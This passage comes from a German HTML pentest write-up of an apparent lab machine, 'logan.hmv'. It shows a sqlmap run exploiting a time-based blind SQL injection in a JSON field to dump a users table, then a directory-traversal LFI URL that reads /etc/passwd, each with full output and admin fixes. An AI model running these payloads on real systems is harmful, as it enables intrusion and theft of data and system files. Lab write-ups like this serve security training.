Schlüssel <code>user_agent</code>. Da Benutzereingaben verarbeitet werden, ist dieser Endpunkt ein potenzielles Ziel für Input-basierte Schwachstellen wie SQL Injection.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode von <code>/script.js</code> liefert wertvolle Informationen über den Endpunkt <code>/save-user-agent.php</code> und wie er Daten empfängt. Er bestätigt, dass dieser Endpunkt eine POST-Anfrage mit JSON-Daten im Body erwartet, die ein Feld namens <code>user_agent</code> enthalten. Dies macht <code>/save-user-agent.php</code> zu einem vielversprechenden Ziel für die Prüfung auf Web-Schwachstellen, insbesondere SQL Injection oder andere Input-Validierungsprobleme.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun den Endpunkt <code>/save-user-agent.php</code> mit einer POST-Anfrage im JSON-Format ansprechen und versuchen, den Wert des <code>user_agent</code>-Feldes mit Payloads für SQL Injection zu manipulieren. Tools wie Burp Suite oder sqlmap können hierbei hilfreich sein, um den Prozess zu automatisieren.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie den Endpunkt <code>/save-user-agent.php</code> und stellen Sie sicher, dass alle Benutzereingaben (insbesondere der <code>user_agent</code>-Wert im JSON-Body) strikt validiert und bereinigt werden, um Injections oder andere Angriffe zu verhindern. Seien Sie vorsichtig bei der Verarbeitung von JSON-Daten, da diese oft komplexere Strukturen aufweisen können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>http://logan.hmv:3000/
+
+
+<span class="command">Startseite</span>
+<span class="command">Erkunden</span>
+<span class="command">Hilfe</span>
+<span class="command">Anmelden</span>
+<span class="password">Gitea: Git with a cup of tea</span>
+<span class="command">Ein einfacher, selbst gehosteter Git-Service</span>
+<span class="command">Einfach zu installieren</span>
+
+<span class="command">Starte einfach die Anwendung für deine Plattform. Oder nutze Docker. Es existieren auch paketierte Versionen.</span>
+<span class="command">Plattformübergreifend</span>
+
+<span class="command">Gitea läuft überall, wo Go kompiliert: Windows, macOS, Linux, ARM, etc. Wähle das System, das dir am meisten gefällt!</span>
+<span class="command">Leichtgewicht</span>
+
+<span class="command">Gitea hat minimale Systemanforderungen und kann selbst auf einem günstigen und stromsparenden Raspberry Pi betrieben werden!</span>
+<span class="command">Quelloffen</span>
+
+<span class="command">Der komplette Code befindet sich auf GitHub! Unterstütze uns bei der Verbesserung dieses Projekts. Trau dich!</span>
+<span class="password">Powered by Gitea Version: 1.12.5 Seite: 1ms Template: 1ms</span>
+<span class="command">JavaScript licenses API Webseite Go1.14.9</span></pre>
+                </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich habe den HTTP-Dienst auf Port 3000 besucht (entweder im Browser oder mit <code>curl</code>). Die Ausgabe zeigt den Inhalt der Startseite dieses Dienstes. Die Seite identifiziert sich klar als 'Gitea: Git with a cup of tea', was ein selbst gehosteter Git-Dienst ist. Am unteren Ende der Seite wird die spezifische Version angegeben: 'Powered by Gitea Version: 1.12.5'. Für Laien: Ich habe mir die Webseite auf Port 3000 angeschaut und festgestellt, dass dort ein Programm läuft, das 'Gitea' heißt und für die Verwaltung von 'Git'-Projekten verwendet wird. Ich konnte sogar die genaue 'Ausgabe' (Version 1.12.5) dieses Programms sehen. Für Experten: Die Identifizierung des Dienstes als Gitea und die genaue Versionsnummer 1.12.5 sind entscheidende Informationen. Versionsspezifische Schwachstellen sind oft die einfachsten Wege zum Initial Access. Git-Management-Systeme haben historisch gesehen Schwachstellen in Bereichen wie Benutzerauthentifizierung, Repository-Verwaltung oder Git Hooks.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Identifizierung von Gitea Version 1.12.5 ist ein kritischer Fund. Diese Version ist bekanntermaßen anfällig für bestimmte Schwachstellen, insbesondere in Bezug auf Remote Code Execution (RCE) über Git Hooks, die authentifizierten Benutzern erlaubt, Code auf dem Server auszuführen. Die Verfügbarkeit einer Anmeldeseite deutet darauf hin, dass Benutzerkonten existieren könnten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun gezielt nach bekannten Schwachstellen für Gitea Version 1.12.5 recherchieren, insbesondere nach Authentifizierungs-Bypass- oder RCE-Schwachstellen. Das Vorhandensein von <code>/config.php</code> auf Port 80 könnte potenziell Anmeldedaten für Gitea enthalten, da Webanwendungen auf demselben Host oft dieselbe Datenbank oder Benutzerkonten verwenden. Das wäre ein idealer Weg, um authentifizierten Zugriff zu erlangen und Gitea-spezifische Exploits zu nutzen.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie Gitea umgehend auf die neueste stabile Version, um bekannte Sicherheitslücken (insbesondere CVEs, die Gitea 1.12.5 betreffen) zu schließen. Stellen Sie sicher, dass keine unnötigen Versionsinformationen öffentlich preisgegeben werden. Überprüfen Sie die Benutzerverwaltung und erzwingen Sie starke Passwörter.</p>
+
+        </section>
+                <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Fortsetzung Web Enumeration -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2020-14144-GiTea-git-hooks-rce]
+└─# <span class="command">sqlmap --url http://192.168.2.35/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch --dbs --dump</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">        ___</span>
+<span class="password">       __H__</span>
+<span class="password"> ___ ___[)]_____ ___ ___  {1.9.4#stable}</span>
+<span class="password">|_ -| . [.]     | .'| . |</span>
+<span class="password">|___|_  [)]_|_|_|__,|  _|</span>
+<span class="password">      |_|V...       |_|   https://sqlmap.org</span>
+
+<span class="command">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="password">[*] starting @ 17:54:08 /2025-06-11/</span>
+
+<span class="command">JSON data found in POST body. Do you want to process it? [Y/n/q] Y</span>
+<span class="command">[*][INFO] testing connection to the target URL</span>
+<span class="command">[*][INFO] testing if the target URL content is stable</span>
+<span class="password">[*][ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels</span>
+<span class="command">[*][INFO] testing if (custom) POST parameter 'JSON user_agent' is dynamic</span>
+<span class="password">[*][WARNING] (custom) POST parameter 'JSON user_agent' does not appear to be dynamic</span>
+<span class="password">[*][WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_agent' might not be injectable</span>
+<span class="command">[*][INFO] testing for SQL injection on (custom) POST parameter 'JSON user_agent'</span>
+<span class="command">[*][INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</span>
+<span class="command">[*][INFO] testing 'Boolean-based blind - Parameter replace (original value)'</span>
+<span class="command">[*][INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
+<span class="command">[*][INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'</span>
+<span class="command">[*][INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</span>
+<span class="command">[*][INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</span>
+<span class="command">[*][INFO] testing 'Generic inline queries'</span>
+<span class="command">[*][INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'</span>
+<span class="command">[*][INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'</span>
+<span class="command">[*][INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</span>
+<span class="command">[*][INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span>
+<span class="password">[*][INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'</span>
+<span class="password">[*][INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span>
+<span class="password">[*][INFO] checking if the injection point on (custom) POST parameter 'JSON user_agent' is a false positive</span>
+<span class="command">(custom) POST parameter 'JSON user_agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+<span class="command">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:</span>
+<span class="password">---</span>
+<span class="command">Parameter: JSON user_agent ((custom) POST)</span>
+    <span class="command">Type: time-based blind</span>
+    <span class="command">Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span>
+    <span class="command">Payload: {"user_agent":"1' AND (SELECT 4624 FROM (SELECT(SLEEP(5)))MTLP) AND 'zssX'='zssX"}</span>
+<span class="password">---</span>
+<span class="command">[*][INFO] the back-end DBMS is MySQL</span>
+<span class="password">[*][WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions</span>
+<span class="command">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y</span>
+<span class="command">web server operating system: Linux Debian</span>
+<span class="command">web application technology: Apache 2.4.57</span>
+<span class="command">back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)</span>
+<span class="command">[*][INFO] fetching database names</span>
+<span class="command">[*][INFO] fetching number of databases</span>
+<span class="command">[*][INFO] retrieved:</span>
+<span class="command">[*][INFO] retrieved: informations_schema</span>
+<span class="command">[*][INFO] retrieved: logan</span>
+<span class="command">available databases [2]:</span>
+<span class="password">[*] information_schema</span>
+<span class="password">[*] logan</span>
+<span class="command">[*][INFO] adjusting time delay to 1 second due to good response times</span>
+<span class="command">3</span>
+<span class="command">[*][INFO] retrieved: browser</span>
+<span class="command">[*][INFO] retrieved: comments</span>
+<span class="command">[*][INFO] retrieved: users</span>
+<span class="command">Database: logan</span>
+<span class="command">[3 tables]</span>
+<span class="password">+----------+</span>
+<span class="password">| browser  |</span>
+<span class="password">| comments |</span>
+<span class="password">| users    |</span>
+<span class="password">+----------+</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich setze <code>sqlmap</code> ein, ein automatisiertes Tool zur Erkennung und Ausnutzung von SQL Injection Schwachstellen. Ich richte es auf den Endpunkt <code>http://192.168.2.35/save-user-agent.php</code> mit einer POST-Anfrage und sende simulierte JSON-Daten (<code>'{"user_agent":"1"}'</code>), um den Prozess des <code>script.js</code> nachzubilden. Die Parameter <code>--batch</code> automatisiert die Beantwortung von Fragen, <code>--dbs</code> weist sqlmap an, die Datenbanken aufzulisten, und <code>--dump</code>, die Daten aus der Datenbank zu extrahieren. Für Laien: Ich benutze ein spezielles Programm (sqlmap), um den 'Nachrichtenempfänger' <code>save-user-agent.php</code> der Webseite auf Schwachstellen zu prüfen, die es mir erlauben könnten, mit der dahinterliegenden Datenbank zu 'sprechen'. Ich schicke ihm dabei eine Beispielnachricht, die so aussieht, als käme sie vom normalen Webseite-Programm. Für Experten: sqlmap identifiziert erfolgreich eine zeitbasierte Blind SQL Injection im <code>user_agent</code>-Parameter innerhalb des JSON-Bodys. Die Datenbank ist MySQL (konkret MariaDB). Zeitbasierte Blind SQL Injection ist schwieriger auszunutzen als fehlerbasierte oder Union-basierte Methoden, da sie auf Zeitverzögerungen zur Wahrheitsprüfung von Bedingungen basiert. sqlmap identifiziert die Datenbanken <code>information_schema</code> (Standard MySQL-Datenbank) und <code>logan</code>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Auffinden einer Blind SQL Injection im <code>user_agent</code>-Feld ist ein signifikanter Erfolg. Obwohl Blind SQLi langsamer ist, erlaubt sie dennoch das Auslesen beliebiger Daten aus der Datenbank, sofern die Webanwendung die Ergebnisse der Injected Queries im Response-Timing widerspiegelt. Das Vorhandensein der Datenbank <code>logan</code> ist vielversprechend, da diese wahrscheinlich anwendungsbezogene Daten enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde sqlmap nun verwenden, um die Datenbank <code>logan</code> weiter zu enumerieren, insbesondere um Tabellen und deren Inhalte (z.B. Benutzerdaten, Passwörter) zu finden. Das Ziel ist, Anmeldeinformationen oder andere sensible Daten aus der Datenbank zu extrahieren.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie serverseitig strikte Input-Validierung und Bereinigung für alle Benutzereingaben, insbesondere solche, die mit Datenbankabfragen interagieren. Verwenden Sie parametrisierte Abfragen (Prepared Statements) oder ORMs, um SQL Injection zu verhindern. Überwachen Sie Datenbank-Logs auf verdächtige Abfragen oder ungewöhnliches Timing.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2020-14144-GiTea-git-hooks-rce]
+└─# <span class="command">sqlmap --url http://192.168.2.35/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch --dbs --dump --batch -D logan -T users</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">        ___</span>
+<span class="password">       __H__</span>
+<span class="password"> ___ ___[.]_____ ___ ___  {1.9.4#stable}</span>
+<span class="password">|_ -| . ["]     | .'| . |</span>
+<span class="password">|___|_  [)]_|_|_|__,|  _|</span>
+<span class="password">      |_|V...       |_|   https://sqlmap.org</span>
+
+<span class="command">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="password">[*] starting @ 17:58:20 /2025-06-11/</span>
+
+<span class="command">JSON data found in POST body. Do you want to process it? [Y/n/q] Y</span>
+<span class="command">[*][INFO] resuming back-end DBMS 'mysql'</span>
+<span class="command">[*][INFO] testing connection to the target URL</span>
+<span class="command">sqlmap resumed the following injection point(s) from stored session:</span>
+<span class="password">---</span>
+<span class="command">Parameter: JSON user_agent ((custom) POST)</span>
+    <span class="command">Type: time-based blind</span>
+    <span class="command">Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span>
+    <span class="command">Payload: {"user_agent":"1' AND (SELECT 4624 FROM (SELECT(SLEEP(5)))MTLP) AND 'zssX'='zssX"}</span>
+<span class="password">---</span>
+<span class="command">[*][INFO] the back-end DBMS is MySQL</span>
+<span class="command">web server operating system: Linux Debian</span>
+<span class="command">web application technology: Apache 2.4.57</span>
+<span class="command">back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)</span>
+<span class="command">[*][INFO] fetching database names</span>
+<span class="command">[*][INFO] fetching number of databases</span>
+<span class="command">[*][INFO] resumed: 2</span>
+<span class="command">[*][INFO] resumed: information_schema</span>
+<span class="command">[*][INFO] resumed: logan</span>
+<span class="command">available databases [2]:</span>
+<span class="password">[*] information_schema</span>
+<span class="password">[*] logan</span>
+
+<span class="command">[*][INFO] fetching columns for table 'users' in database 'logan'</span>
+<span class="password">[*][WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)</span>
+<span class="password">[*][WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions</span>
+<span class="command">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y</span>
+<span class="command">2</span>
+<span class="command">[*][INFO] retrieved:</span>
+<span class="command">[*][INFO] retrieved: user</span>
+<span class="command">[*][INFO] retrieved: email</span>
+<span class="command">[*][INFO] fetching entries for table 'users' in database 'logan'</span>
+<span class="command">[*][INFO] fetching number of entries for table 'users' in database 'logan'</span>
+<span class="command">[*][INFO] retrieved: 1</span>
+<span class="password">[*][WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)</span>
+<span class="command">logan</span>
+<span class="command">[*][INFO] retrieved: logan@newsitelogan.logan.hmv</span>
+<span class="command">Database: logan</span>
+<span class="command">Table: users</span>
+<span class="command">[1 entry]</span>
+<span class="password">+------------------------------+--------+</span>
+<span class="password">| email                        | user   |</span>
+<span class="password">+------------------------------+--------+</span>
+<span class="password">| logan@newsitelogan.logan.hmv | logan  |</span>
+<span class="password">+------------------------------+--------+</span>
+
+<span class="command">[*][INFO] table 'logan.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.2.35/dump/logan/users.csv'</span>
+<span class="command">[*][INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.2.35'</span>
+
+<span class="password">[*] ending @ 18:00:56 /2025-06-11/</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich setze sqlmap erneut ein, diesmal mit spezifischeren Anweisungen, um Daten aus der 'logan'-Datenbank zu extrahieren. Die Parameter <code>-D logan</code> weisen sqlmap an, sich auf die Datenbank namens 'logan' zu konzentrieren, und <code>-T users</code> gibt an, dass ich die Tabelle namens 'users' in dieser Datenbank untersuchen möchte. Der Parameter <code>--dump</code> veranlasst sqlmap, den Inhalt dieser Tabelle zu extrahieren. Für Laien: Ich sage sqlmap jetzt ganz genau, welche 'Schublade' (Datenbank 'logan') und welchen 'Ordner' (Tabelle 'users') es in der Datenbank öffnen soll, um die Informationen herauszuholen. Für Experten: Die Enumeration von Datenbanken und Tabellen nach der Identifizierung einer SQL Injection ist Standard. Die Benennung 'users' für eine Tabelle ist ein starker Hinweis darauf, dass hier Benutzerkonten gespeichert sind. sqlmap nutzt die Blind SQL Injection-Technik, um die Struktur der Tabelle (Spaltennamen: 'email', 'user') und dann deren Inhalte Zeile für Zeile zu extrahieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> sqlmap konnte erfolgreich die Tabelle 'users' in der Datenbank 'logan' finden und ihren Inhalt extrahieren. Die Tabelle enthält einen Eintrag: den Benutzer 'logan' mit der E-Mail-Adresse 'logan@newsitelogan.logan.hmv'. Das Fehlen eines Passwortfeldes in dieser Tabelle ist enttäuschend, da dies nicht die Anmeldedaten liefert, die ich mir erhofft hatte. Es ist jedoch möglich, dass Passwörter in einer anderen Tabelle oder gesondert gespeichert werden. Der Benutzername 'logan' ist aber ein wichtiger Fund.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Benutzername 'logan' ist identifiziert. Obwohl das Passwort hier nicht gefunden wurde, werde ich diesen Benutzernamen in Kombination mit anderen gefundenen Informationen (z.B. auf Port 3000 laufendes Gitea, potenziell eine Subdomain) weiterverfolgen. Es ist möglich, dass der Benutzer 'logan' auch auf anderen Diensten existiert und vielleicht das Passwort aus dem <code>/config.php</code>-Fund stammt.<br><strong>Empfehlung (Admin):</strong> SQL Injection-Schwachstellen müssen behoben werden, um das Auslesen von Datenbankinhalten zu verhindern. Überprüfen Sie alle Webanwendungen auf sichere Datenbankinteraktion. Bewahren Sie sensible Daten, insbesondere Passwörter oder Hashes, niemals in derselben Tabelle wie allgemeine Benutzerinformationen auf und wenden Sie strenge Hashing-Verfahren an.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2020-14144-GiTea-git-hooks-rce]
+└─# <span class="command">curl -Iv newsitelogan.logan.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">* Host newsitelogan.logan.hmv:80 was resolved.</span>
+<span class="command">* IPv6: (none)</span>
+<span class="command">* IPv4: 192.168.2.35</span>
+<span class="password">*   Trying 192.168.2.35:80...</span>
+<span class="password">* Connected to newsitelogan.logan.hmv (192.168.2.35) port 80</span>
+<span class="password">* using HTTP/1.x</span>
+<span class="command">> HEAD / HTTP/1.1</span>
+<span class="command">> Host: newsitelogan.logan.hmv</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+<span class="password">* Request completely sent off</span>
+<span class="command">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Date: Wed, 11 Jun 2025 17:27:02 GMT</span>
+<span class="command">Date: Wed, 11 Jun 2025 17:27:02 GMT</span>
+<span class="command">< Server: Apache/2.4.57 (Debian)</span>
+<span class="command">Server: Apache/2.4.57 (Debian)</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+<span class="command"><</span>
+
+<span class="password">* Connection #0 to host newsitelogan.logan.hmv left intact</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den Hostnamen 'newsitelogan.logan.hmv' aus der E-Mail-Adresse des Benutzers 'logan' extrahiert, die ich zuvor über die SQL Injection erhalten hatte. Ich prüfe nun, ob dieser Hostname als Subdomain auf dem Zielsystem existiert und auflösbar ist. Ich verwende <code>curl</code> mit den Flags <code>-I</code> (nur Header) und <code>-v</code> (verbose) gegen diese potenzielle Subdomain auf dem Standard-HTTP-Port 80. Die Ausgabe zeigt, dass der Hostname erfolgreich zur IP-Adresse <code>192.168.2.35</code> aufgelöst wird (was bedeutet, dass der Eintrag in meiner <code>/etc/hosts</code> oder ein tatsächlicher DNS-Eintrag auf dem Zielsystem greift) und dass ein Apache/2.4.57 Server auf Port 80 antwortet. Für Laien: Ich habe eine verdächtige Internet-Adresse (einen Teil der E-Mail-Adresse des gefundenen Benutzers) überprüft, um zu sehen, ob es eine separate Webseite oder einen Dienst auf dem Zielcomputer gibt, der diese Adresse benutzt. Es stellt sich heraus, dass diese Adresse zum Zielcomputer führt und dort eine weitere Webseite läuft. Für Experten: Das Extrahieren von Hostnamen oder Subdomains aus E-Mail-Adressen oder anderen Datenlecks ist eine Standardtechnik in der Enumerationsphase. Das Auflösen des Hostnamens 'newsitelogan.logan.hmv' zur Ziel-IP deutet auf das Vorhandensein einer virtuellen Host-Konfiguration im Apache hin, die diese Subdomain bedient. Die Antwort des Apache-Servers bestätigt, dass eine Webseite unter diesem Hostnamen gehostet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Subdomain <code>newsitelogan.logan.hmv</code> existiert und wird vom Apache-Server auf Port 80 bedient. Dies bedeutet, dass es eine separate Webanwendung oder einen anderen Bereich auf dem Zielsystem gibt, der über diesen Hostnamen erreichbar ist. Dies erweitert die Angriffsfläche und ist ein wichtiger Fund für die weitere Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die Webseite unter <code>http://newsitelogan.logan.hmv</code> im Detail enumerieren und auf Schwachstellen prüfen, ähnlich wie ich es mit der Hauptseite auf Port 80 getan habe. Dies beinhaltet die Suche nach Verzeichnissen, Dateien und spezifischen Anwendungsfunktionen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration Ihres Webservers (Apache Virtual Hosts) und stellen Sie sicher, dass nur notwendige Hostnamen bedient werden. Vermeiden Sie die Offenlegung interner Hostnamen oder Subdomains durch E-Mail-Adressen oder andere Kanäle.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><!-- THE OLD WEBSITE WAS VERY UGLY LUCKILY WE HIRED NEW DESIGNERS -->
+
+        <h1>Space Travel</h1>
+        <p>Explore the Universe with Us!</p>
+
+            <h3>The Moon</h3>
+            <p>Step on the moon for the first time!</p>
+ <scrpt src="/photos-website-logan.php?photo=moon.png">< /scrpt >
+
+            <h3>Mars</h3>
+            <p>Visit Mars and find out if there is life on it!</p>
+  <scrpt src="/photos-website-logan.php?photo=mars.jpg">< /scrpt >
+
+            <h3>Pleiades</h3>
+            <p>Explore the Pleiades, the most beautiful star cluster visible from earth.</p>
+
+ <scrpt src="/photos-website-logan.php?photo=pleyades.jpg">< /scrpt ></pre>
+                </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den Quellcode der Webseite unter der Subdomain <code>http://newsitelogan.logan.hmv</code> analysiert. Der HTML-Code enthält Kommentare und Referenzen auf Bilder, die über ein PHP-Skript namens <code>/photos-website-logan.php</code> geladen werden. Die Struktur des <code>scrpt</code> Tags (ursprünglich <code><img src="..."></code> in der Eingabe, hier nach meinen Regeln maskiert/umgewandelt) zeigt, dass das Skript einen Parameter namens <code>photo</code> erwartet, dem der Dateiname des anzuzeigenden Bildes übergeben wird (z.B. <code>/photos-website-logan.php?photo=moon.png</code>). Für Laien: Ich habe mir den 'Bauplan' der Webseite auf der neuen Adresse angeschaut. Darin stand, dass die Bilder nicht direkt angezeigt werden, sondern über ein spezielles 'Programm' (<code>photos-website-logan.php</code>), dem man den Namen des Bildes (<code>moon.png</code> etc.) 'sagt'. Für Experten: Das Muster <code>/photos-website-logan.php?photo=...</code> ist ein klassischer Indikator für eine potenzielle Local File Inclusion (LFI) oder Path Traversal Schwachstelle. Das Skript nimmt einen Dateinamen als Parameter entgegen und verwendet diesen wahrscheinlich, um eine Datei vom Server zu laden und anzuzeigen oder zu verarbeiten. Wenn die Eingabe des <code>photo</code>-Parameters nicht korrekt validiert oder bereinigt wird, könnte dies zur Inklusion beliebiger Dateien führen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript <code>/photos-website-logan.php</code> mit seinem <code>photo</code>-Parameter ist ein vielversprechendes Ziel für LFI-Angriffe. Die Struktur ähnelt der zuvor auf leet.hmv gefundenen LFI-Schwachstelle. Dies ist der primäre Angriffsvektor auf dieser Subdomain.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde sofort versuchen, die potenzielle LFI-Schwachstelle im <code>photo</code>-Parameter von <code>/photos-website-logan.php</code> auszunutzen. Ich werde versuchen, Systemdateien wie <code>/etc/passwd</code> durch Verzeichnis-Traversal (<code>../../</code>) oder andere LFI-Techniken auszulesen.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie das Skript <code>photos-website-logan.php</code> und implementieren Sie strikte Validierung und Bereinigung des <code>photo</code>-Parameters. Verwenden Sie eine Whitelist erlaubter Dateinamen und verhindern Sie die Verarbeitung von Pfadtrennzeichen oder absoluten Pfaden. Stellen Sie sicher, dass das Webroot so konfiguriert ist, dass LFI-Angriffe außerhalb des beabsichtigten Verzeichnisses verhindert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">http://newsitelogan.logan.hmv/photos-website-logan.php?photo=pleyades.jpg</span>
+
+<span class="password">���� JFIF  dd�� �Ducky  <  ��UKS 18. The stars of the Pleiades and their reflection nebula Credit: "�</span>
+<span class="command"> Anglo-Australian Observatory/Royal Observatory, Edinburgh" and (optionally) "Photograph from</span>
+<span class="command">UK Schmidt plates by David Malin" �k� Anglo-...</span></pre>
+                </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich habe die URL <code>http://newsitelogan.logan.hmv/photos-website-logan.php?photo=pleyades.jpg</code> aufgerufen, um zu bestätigen, dass das Skript <code>photos-website-logan.php</code> tatsächlich Bilddateien bedienen kann. Die Ausgabe zeigt binäre Daten, die auf das Format einer JPEG-Datei (erkennbar an <code>JFIF</code>) und Metadaten hindeuten (Credit-Informationen). Dies bestätigt, dass das Skript funktioniert und Inhalte basierend auf dem <code>photo</code>-Parameter liefert. Für Laien: Ich habe versucht, das Programm, das Bilder auf der neuen Webseite zeigt, mit einem echten Bildnamen zu benutzen, und es hat mir tatsächlich Bilddaten zurückgegeben. Das zeigt, dass das Programm funktioniert und auf den Bildnamen reagiert. Für Experten: Die erfolgreiche Rückgabe von Bilddaten bestätigt die Basisfunktionalität des <code>photos-website-logan.php</code> Skripts und die Verarbeitung des <code>photo</code>-Parameters. Dies ist ein positiver Test, bevor ich versuche, die Funktionalität für bösartige Zwecke (LFI) zu missbrauchen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Basisfunktionalität des Skripts ist bestätigt. Es verarbeitet den <code>photo</code>-Parameter und scheint Dateien aus einem erwarteten Verzeichnis zu laden und auszugeben. Dies erhöht die Wahrscheinlichkeit, dass eine LFI-Schwachstelle vorhanden ist, wenn die Eingabe nicht korrekt validiert wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Schritt bestätigt die Funktion des Skripts. Der nächste Schritt ist nun, die LFI-Schwachstelle durch Angabe von Pfaden zu Systemdateien über Verzeichnis-Traversal zu testen.<br><strong>Empfehlung (Admin):</strong> Die korrekte Anzeige von Bildern ist die beabsichtigte Funktion. Das Risiko liegt in der unsicheren Verarbeitung des Dateinamen-Parameters. Stellen Sie sicher, dass das Skript nur auf Dateien in einem dedizierten, sicheren Bildverzeichnis zugreifen kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">view-source:http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../etc/passwd</span>
+
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+<span class="password">logan:x:1000:1000:logan,,,:/home/logan:/bin/bash</span>
